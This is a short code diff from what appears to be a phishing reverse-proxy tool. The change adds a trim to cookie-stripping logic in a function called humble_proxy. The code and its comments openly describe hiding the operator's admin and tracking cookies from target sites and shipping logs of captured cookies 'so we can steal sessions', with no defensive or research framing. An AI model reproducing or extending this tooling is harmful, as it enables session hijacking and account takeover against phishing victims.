@@ -191,7 +191,7 @@ async function humble_proxy(request, reply){
       //don't leak our admin cookie or tracking cookies to any target domains
       admin_cookie_regex = RegExp(admin_config.admin_cookie.cookie_name + '.?=.?' + admin_config.admin_cookie.cookie_value + '.?;? ?', 'gi')
       tracking_cookie_regex = new RegExp(domain_config.tracking_cookie + '=([^;]*)(;|$)', 'i')
-      myreq.headers.cookie = myreq.headers.cookie.replace(admin_cookie_regex, '').replace(tracking_cookie_regex, '')
+      myreq.headers.cookie = myreq.headers.cookie.replace(admin_cookie_regex, '').replace(tracking_cookie_regex, '').trim()
       //ship logs if we get some cookies so we can steal sessions
       if(tracking_id != '' & Object.keys(request.cookies).length > 1){
         delete request.cookies[domain_config.tracking_cookie]
